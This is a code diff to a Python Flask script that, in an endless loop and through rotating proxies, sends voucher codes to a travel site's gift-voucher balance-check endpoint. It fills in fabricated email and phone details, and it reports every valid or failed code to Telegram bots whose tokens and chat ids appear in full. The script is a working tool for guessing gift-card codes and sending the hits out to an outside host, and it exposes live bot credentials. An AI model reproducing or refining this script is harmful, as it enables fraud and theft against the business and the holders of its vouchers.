@@ -5,16 +5,17 @@ from flask import Flask, jsonify
 import json
 import threading
 import time
+import os
 
 app = Flask(__name__)
 
-# Global variable to track the number of requests
+# Global request counter
 request_count = 0
 
 # Helper function to generate random email
 def generate_random_email():
     email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    return "Y2GTVY8X0D7C5EY" #f"{email_prefix}@gmail.com"
+    return f"{email_prefix}@gmail.com"
 
 # Helper function to generate random phone number
 def generate_random_phone():
@@ -30,17 +31,9 @@ def send_telegram_message(url, message):
     telegram_url = f"{url}&text={message}"
     requests.get(telegram_url)
 
-# Function to load proxies from the proxies.txt file
-def load_proxies():
-    with open("proxies.txt", "r") as file:
-        proxies = file.readlines()
-    # Assuming the proxies.txt file has one proxy per line, in the format 'proxy:port'
-    return [proxy.strip() for proxy in proxies]
-
 # API request function
-def send_api_request(proxy):
-    global request_count  # Access the global variable to increment the request count
-
+def send_api_request(proxy=None):
+    global request_count
     # Define the URL and payload
     url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"
 
@@ -75,38 +68,40 @@ def send_api_request(proxy):
         'x-requested-with': 'XMLHttpRequest'
     }
 
-    # Append 'http://' to the proxy if it's not already there
-    proxy = f"http://{proxy}"
+    # If a proxy is provided, use it in the request
+    proxies = None
+    if proxy:
+        proxies = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}"
+        }
 
-    # Define proxy
-    proxies = {
-        'http': proxy,
-        'https': proxy
-    }
-
-    # Send API request with proxy
+    # Send API request
     response = requests.post(url, headers=headers, data=json.dumps(payload), proxies=proxies)
 
     # Process the response
     response_data = response.json()
 
     if response_data.get('resCode') == 1:  # Failed response
-        failed_message = f"CODE : {payload['vouchers'][0]['code']}\n\nAPI Response:\n{json.dumps(response_data, indent=4)}"
+        failed_message = f"CODE: {payload['vouchers'][0]['code']}\nAPI Response:\n{json.dumps(response_data, indent=4)}"
         send_telegram_message("https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395", failed_message)
     elif response_data.get('resCode') == 0:  # Success response
-        success_message = f"CODE : {payload['vouchers'][0]['code']}\n\nAPI Response:\n{json.dumps(response_data, indent=4)}"
+        success_message = f"Success: Voucher Code {payload['vouchers'][0]['code']} - Amount: {response_data['amount']}"
         send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-680337101", success_message)
-
-    # Increment the request count after sending each request
+    
+    # Increment the request count
     request_count += 1
 
 # Function to run the request in an infinite loop
 def run_infinite_loop():
-    proxies = load_proxies()  # Load proxies from the file
+    # Read the proxies from the file
+    with open('proxies.txt', 'r') as file:
+        proxies = file.readlines()
+
     while True:
         try:
-            proxy = random.choice(proxies)  # Pick a random proxy from the list
-            send_api_request(proxy)
+            proxy = random.choice(proxies).strip()  # Randomly pick a proxy from the file
+            send_api_request(proxy)  # Send the API request using the selected proxy
             time.sleep(5)  # Wait for 5 seconds before sending the next request
         except Exception as e:
             print(f"Error in sending request: {e}")
@@ -123,5 +118,7 @@ if __name__ == '__main__':
     loop_thread.daemon = True  # Daemonize the thread so it will exit when the main program exits
     loop_thread.start()
 
+    # Get the port from the environment, defaulting to 5000 if not found
+    port = int(os.environ.get('PORT', 5000))
     # Start the Flask app
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0', port=port)
